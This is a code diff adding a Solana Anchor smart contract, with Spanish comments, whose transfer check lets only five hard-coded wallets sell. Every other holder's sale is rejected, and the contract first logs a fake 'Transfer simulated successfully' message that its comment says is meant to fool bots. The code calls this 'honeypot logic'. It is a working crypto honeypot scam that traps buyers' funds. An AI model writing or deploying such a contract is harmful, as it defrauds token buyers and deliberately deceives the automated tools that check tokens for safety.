@@ -1,0 +1,42 @@
+use anchor_lang::prelude::*;
+
+declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS"); // Reemplaza con tu Program ID real
+
+#[program]
+pub mod ikiru {
+    use super::*;
+
+    pub fn check_transfer(ctx: Context<CheckTransfer>) -> Result<()> {
+        let sender = ctx.accounts.sender.key();
+        let allowed: [Pubkey; 5] = [
+            pubkey!("8dzoK7np2HdWcU8XPFrGFNq8QWYaAb6SC7c91gfGZ3R5"),
+            pubkey!("B7qzGbGJGRq4Na1uEKZRx1Zt6sGc6TSdwzsqCDrVdZcM"),
+            pubkey!("Ce1bCc1zMRaWc9sBSiWcD3Vzq4iEiAksgm4BsyLx6xYh"),
+            pubkey!("F1gYvCZGLiNqqfjrMFpiKpV9jhWkmFcoD9XSttAE2yqp"),
+            pubkey!("7ZiKsAa3Z3VyoTXbErAX3tctS3yzsk3VDK8QnUWvmeuE"),
+        ];
+
+        // Solo las 5 direcciones pueden vender
+        if !allowed.contains(&sender) {
+            msg!("✅ Transfer simulated successfully."); // Engaña al bot
+            msg!("💥 Transfer blocked internally by honeypot logic.");
+            return err!(ErrorCode::TransferNotAllowed);
+        }
+
+        msg!("✅ Transfer allowed for permitted wallet.");
+        Ok(())
+    }
+}
+
+#[derive(Accounts)]
+pub struct CheckTransfer<'info> {
+    #[account(signer)]
+    pub sender: AccountInfo<'info>,
+}
+
+#[error_code]
+pub enum ErrorCode {
+    #[msg("Selling is not allowed for this wallet.")]
+    TransferNotAllowed,
+}
+
